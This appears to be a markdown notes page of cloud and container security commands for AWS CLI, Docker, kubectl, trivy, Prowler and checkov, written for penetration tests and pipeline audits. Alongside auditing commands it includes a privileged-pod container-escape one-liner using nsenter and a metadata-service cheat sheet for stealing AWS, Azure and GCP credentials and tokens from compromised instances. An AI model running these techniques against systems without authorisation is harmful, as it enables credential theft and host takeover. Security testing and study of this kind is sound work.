---
type: section
room: green
tags: [green/instruments]
---

# Green: Instruments

> [!quote]
> *"The Irregulars have eyes and ears everywhere."*

Cloud CLIs, container tools, IaC scanners — with the commands you actually use in an engagement or pipeline audit.

---

## ☁️ AWS CLI

**Purpose:** Interact with AWS services — enumeration, exploitation, hardening.

```bash
# Configure
aws configure     # set key, secret, region, output

# Check who you are
aws sts get-caller-identity

# === IAM ===
aws iam list-users
aws iam list-groups
aws iam list-roles
aws iam get-user
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>  # inline
aws iam get-policy --policy-arn <arn>
aws iam simulate-principal-policy --policy-source-arn <arn> --action-names "*"

# === EC2 ===
aws ec2 describe-instances --output table
aws ec2 describe-security-groups | jq '.SecurityGroups[] | select(.IpPermissions[].IpRanges[].CidrIp == "0.0.0.0/0")'
aws ec2 describe-vpcs

# === S3 ===
aws s3 ls                              # list buckets
aws s3 ls s3://<bucket>/              # list bucket contents
aws s3 cp s3://<bucket>/<file> .      # download file
aws s3 cp . s3://<bucket>/ --recursive  # upload
aws s3api get-bucket-acl --bucket <bucket>        # check ACL
aws s3api get-bucket-policy --bucket <bucket>     # check bucket policy
aws s3api get-bucket-encryption --bucket <bucket> # check encryption

# === LAMBDA ===
aws lambda list-functions
aws lambda get-function --function-name <name>
aws lambda invoke --function-name <name> output.txt

# === SECRETS MANAGER ===
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <id>

# === CLOUDTRAIL ===
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name <name>
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin

# === IMDS (from EC2 instance) ===
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# v2 requires token first:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

---

## 🐳 Docker

**Purpose:** Build, manage, and security-test containers.

```bash
# Build image
docker build -t myapp:latest .
docker build -f Dockerfile.prod -t myapp:prod .

# Run container
docker run -it ubuntu bash
docker run -d -p 80:80 --name webserver nginx:latest
docker run -v /host/path:/container/path myapp  # bind mount
docker run --env-file .env myapp                 # env vars

# Security-relevant flags
docker run --read-only myapp           # read-only filesystem
docker run --no-new-privileges myapp   # no setuid escalation
docker run --cap-drop ALL myapp        # drop all capabilities
docker run --security-opt no-new-privileges myapp

# Inspect
docker ps                              # running containers
docker ps -a                           # all containers
docker inspect <container>             # full config
docker logs <container>                # stdout/stderr
docker exec -it <container> bash       # shell into running container

# Images
docker images
docker image inspect <image>
docker history <image>    # layers (check for secrets!)

# Check if privileged (from inside container)
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link delete dummy0

# Scan image
trivy image <image>
docker scout quickview <image>

# Save and load images
docker save myapp > myapp.tar
docker load < myapp.tar
```

---

## ☸️ kubectl — Kubernetes

**Purpose:** Manage and audit Kubernetes clusters.

```bash
# Context / cluster management
kubectl config get-contexts
kubectl config use-context <context>
kubectl cluster-info

# === ENUMERATION ===
kubectl get all -n <namespace>
kubectl get pods -A             # all namespaces
kubectl get nodes -o wide
kubectl get secrets -A
kubectl get serviceaccounts -A
kubectl get clusterrolebindings -A | grep -v "^system:"

# Check permissions (what can current SA do?)
kubectl auth can-i --list -n default
kubectl auth can-i get pods -n kube-system
kubectl auth can-i create pods

# Describe resources (look for securityContext!)
kubectl describe pod <pod>
kubectl describe node <node>

# Get pod spec (check for privileged, hostPID, volumes)
kubectl get pod <pod> -o yaml | grep -E "privileged|hostPID|hostNetwork|hostPath"

# === EXEC / SHELL ===
kubectl exec -it <pod> -- bash
kubectl exec -it <pod> -c <container> -- sh

# === LOGS ===
kubectl logs <pod>
kubectl logs <pod> -c <container>
kubectl logs <pod> --previous           # crashed container

# === PORT-FORWARD (access internal services) ===
kubectl port-forward svc/<service> 8080:80

# === SECRETS ===
kubectl get secret <name> -o jsonpath='{.data}' | base64 -d
kubectl get secret <name> -o yaml | kubectl neat

# === PRIVILEGED POD (escape technique) ===
kubectl run pwned --image=ubuntu --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"pwned","image":"ubuntu","command":["sleep","86400"],"securityContext":{"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}' \
  -- sleep 86400
kubectl exec -it pwned -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

---

## 🔍 trivy — All-in-One Scanner

```bash
# Container image
trivy image nginx:latest --severity HIGH,CRITICAL

# Filesystem / repo
trivy fs . --scanners vuln,secret,config

# IaC config
trivy config ./terraform/
trivy config ./k8s/

# JSON output for CI/CD
trivy image nginx:latest -f json -o results.json

# Table output (default)
trivy image nginx:latest --format table

# Ignore CVEs
echo "CVE-2021-1234" >> .trivyignore

# SBOM generation
trivy image --format spdx-json --output sbom.spdx.json nginx:latest
```

---

## 🛡️ Prowler — Cloud Security Audit

**Purpose:** CIS benchmark and compliance checks for AWS, Azure, GCP.

```bash
# Install
pip install prowler

# AWS — all checks
prowler aws

# AWS — specific compliance framework
prowler aws --compliance cis_2.0_aws

# AWS — specific service only
prowler aws --service s3
prowler aws --service iam
prowler aws --service ec2

# Output formats
prowler aws -M html,json-ocsf

# Azure
prowler azure --az-cli-auth
prowler azure --compliance cis_2.0_azure

# GCP
prowler gcp --project-id <project>
```

---

## 🔐 checkov — IaC Security Scanner

**Purpose:** Policy-as-code checks for Terraform, Kubernetes, Docker, CloudFormation.

```bash
# Install
pip install checkov

# Scan Terraform directory
checkov -d ./terraform

# Scan specific file
checkov -f main.tf

# Scan Kubernetes manifests
checkov -d ./k8s/manifests --framework kubernetes

# Scan Dockerfile
checkov -f Dockerfile --framework dockerfile

# Scan CloudFormation
checkov -f template.yaml --framework cloudformation

# Compact output (only failures)
checkov -d . --compact --quiet

# Skip specific check
checkov -d . --skip-check CKV_AWS_18

# JSON output for CI
checkov -d . -o json > checkov-results.json

# Custom rules
checkov -d . --external-checks-dir ./custom_checks
```

---

## 🔑 IMDS Cheat Sheet

```bash
# AWS — Instance Metadata Service
# Get IAM role credentials from compromised EC2 (SSRF or shell)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | jq '.'

# Use stolen credentials
export AWS_ACCESS_KEY_ID=<KeyId>
export AWS_SECRET_ACCESS_KEY=<SecretKey>
export AWS_SESSION_TOKEN=<Token>
aws sts get-caller-identity

# Azure IMDS
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq '.'
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq '.access_token'

# GCP IMDS
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/"
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq '.access_token'
```

↩ [[Green]] · [[Mind Palace]]